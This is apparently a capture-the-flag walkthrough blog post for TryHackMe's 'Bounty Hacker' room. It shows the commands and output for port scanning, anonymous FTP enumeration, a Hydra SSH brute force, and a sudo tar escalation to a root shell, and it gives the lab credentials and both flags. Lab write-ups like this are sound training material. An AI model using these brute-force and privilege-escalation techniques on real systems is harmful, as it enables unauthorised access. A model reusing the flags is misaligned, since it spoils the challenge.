---
title: "Bounty Hacker"
date: 2025-12-24
draft: false
description: "Walkthrough of Bounty Hacker from TryHackMe. Anonymous FTP with reconnaissance files, SSH bruteforce with Hydra and privilege escalation via sudo tar — eJPT preparation."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ftp",
    "hydra",
    "ssh",
    "tar",
    "sudo",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 5
---

## Summary

**Bounty Hacker** is the fifth machine in the _Road to eJPTv2_ series and one of the most straightforward in terms of attack flow. Anonymous FTP doesn't just confirm lax configurations — this time it **directly delivers** a password wordlist and the target username. With that data, Hydra does the heavy lifting against SSH. The escalation via `sudo tar` introduces a new GTFOBins binary worth knowing.

| Attribute      | Value                                                    |
| -------------- | -------------------------------------------------------- |
| **Platform**   | TryHackMe                                                |
| **Difficulty** | Easy                                                     |
| **OS**         | Linux                                                    |
| **Room**       | [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) |
| **Skills**     | FTP Enum, SSH Bruteforce, Sudo Privesc (tar)             |

### 🎥 Video version

{{< youtube -5pLjSCvwGo >}}

> If you prefer to follow the walkthrough step by step, keep reading. The video covers the same process in visual format.

### Tools used

- `nmap` — port and service enumeration
- `ftp` — anonymous access and file download
- `hydra` — SSH bruteforce with wordlist obtained from FTP
- `ssh` — access with obtained credentials

### Solution overview

1. Nmap reveals FTP (21), SSH (22) and HTTP (80)
2. Anonymous FTP exposes two files: `task.txt` (user `lin`) and `locks.txt` (password wordlist)
3. Hydra SSH bruteforce with `lin` and `locks.txt` → password `RedDr4gonSynd1cat3`
4. SSH access as `lin` → user flag
5. `sudo -l` reveals `lin` can run `/bin/tar` as root
6. `sudo tar` abuse with shell payload → root

---

## Reconnaissance

### Connectivity check

```bash
ping -c 1 10.67.160.220
64 bytes from 10.67.160.220: icmp_seq=1 ttl=62 time=70.0 ms
```

> **TTL=62** → target is **Linux**. The TTL is 62 instead of the usual 60 — this happens when there are one or two network hops between attacker and target. Still Linux.

### Nmap port scan

Initial sweep of all TCP ports:

```bash
nmap 10.67.160.220 -n -Pn -sS -p- --open --min-rate=5000 -oG allTCPports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

> **Note on `--open`:** this flag filters output showing only open ports, ignoring filtered or closed ones. Useful to avoid noise on machines with many filtered ports — like this one, which had 55531 filtered ports.

Targeted scan with version detection and scripts:

```bash
nmap 10.67.160.220 -n -Pn -sS -sCV -p21,22,80 --min-rate=5000 -oN scanBounty.txt
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

> **Key findings:**
>
> - **Port 21:** vsftpd with anonymous login enabled — first vector to explore
> - **Port 22:** SSH — potential bruteforce target if we find credentials
> - **Port 80:** Apache — web review pending

### Anonymous FTP enumeration

```bash
ftp 10.67.160.220 21
Name: anonymous
230 Login successful.
ftp> ls
-rw-rw-r-- 1 ftp ftp  418 Jun 07 2020 locks.txt
-rw-rw-r-- 1 ftp ftp   68 Jun 07 2020 task.txt
```

Two accessible files. We download them:

```bash
ftp> get locks.txt
ftp> get task.txt
```

We review their contents:

**`task.txt`** — task list signed by user `lin`:

1.) Protect Vicious.
2.) Get Trophies on the shelf.

> **Critical finding:** the file is signed by **`lin`** — we have a valid system username.

**`locks.txt`** — list of possible passwords (custom wordlist):

```bash
rEddrAGON
ReDdr4gON
RedDr4gonSynd1cat3
```

> **Ideal attacker scenario:** the anonymous FTP server just handed us the username (`lin`) and its password wordlist (`locks.txt`). This is a critical misconfiguration — never expose sensitive files on anonymous FTP.

---

## Exploitation

### SSH bruteforce with Hydra

With the username and wordlist in hand, we launch Hydra against SSH:

```bash
hydra -l lin -P ./locks.txt ssh://10.67.160.220 -t 4
```

**Flag justification:**

- `-l lin` single user (already known from `task.txt`)
- `-P locks.txt` custom wordlist obtained from FTP
- `-t 4` 4 parallel tasks (higher can cause SSH lockouts)

```bash
[22][ssh] host: 10.67.160.220  login: lin  password: RedDr4gonSynd1cat3
```

> **Credentials obtained:** `lin:RedDr4gonSynd1cat3`

The attack finished in **10 seconds** because the wordlist was small and targeted. This is the difference between a generic wordlist (rockyou.txt with 14 million entries) and a directed one — when you have the right wordlist, bruteforce is almost instant.

### SSH access

```bash
ssh lin@10.67.160.220
Welcome to Ubuntu 20.04.6 LTS
lin@ip-10-67-160-220:~$
```

---

## Post-exploitation

### User flag

```bash
cat ~/Desktop/user.txt
```

> **User flag:** `THM{CR1M3_SyNd1C4T3}`

### Sudo enumeration

```bash
sudo -l
User lin may run the following commands on ip-10-67-160-220:
(root) /bin/tar
```

> **Critical finding:** `lin` can run `tar` as root without a password. `tar` is a file archiver that under normal conditions should not have sudo permissions. GTFOBins documents exactly how to abuse this.

---

## Privilege Escalation

### Sudo tar abuse

`tar` has an `-I` flag that allows specifying an external program for compression/decompression. We can abuse this to execute arbitrary commands with root privileges:

```bash
sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
```

```bash
# whoami
root
```

> **What does this command do?**
>
> - `sudo tar` runs tar with root privileges
> - `xf /dev/null` attempts to extract from `/dev/null` (empty file — doesn't fail but does nothing real)
> - `-I '/bin/sh -c "sh <&2 1>&2"'` specifies a `/bin/sh` shell as the "decompressor"
> - `<&2 1>&2` redirects stdin from stderr and stdout to stderr — trick to get an interactive shell from tar

### Root flag

```bash
cd /root
cat root.txt
```

> **Root flag:** `THM{80UN7Y_h4cK3r}`

---

## Lessons learned

- **Anonymous FTP can be more dangerous than it looks** — In previous machines (Simple CTF) anonymous FTP didn't give directly useful information. Here it delivered username and wordlist. Always list and download everything available on anonymous FTP before moving to the next vector.
- **A targeted wordlist is exponentially more effective** — `locks.txt` had 26 passwords. rockyou.txt has 14 million. Hydra found the password in 10 seconds with the right wordlist. In a real pentest, collecting target-specific information before launching bruteforce attacks makes all the difference.
- **`sudo -l` is still the first post-shell command** — Four machines in a row with privesc via sudo. The pattern is consistent: always the first thing you check.
- **GTFOBins isn't just Python and Vim** — `tar`, `find`, `awk`, `perl`, `nmap`... dozens of common binaries have escape techniques documented on GTFOBins. Learn to search there when you find an unusual binary with sudo or SUID.
- **`--open` in Nmap is your friend** — On machines with many filtered ports, the `--open` flag cleans output and focuses you on what matters. Use it when the first scan shows thousands of filtered ports.

### For the eJPT

This machine exercises skills directly evaluated on the eJPT:

- Anonymous FTP enumeration with file extraction
- Directed SSH bruteforce with Hydra
- Privilege escalation via sudo misconfiguration
- Using GTFOBins as a privesc reference

**Approximate solving time:** 15-20 minutes — one of the fastest machines in the series once you understand the flow.

---

## References

- [Bounty Hacker — TryHackMe](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [Hydra documentation](https://github.com/vanhauser-thc/thc-hydra)
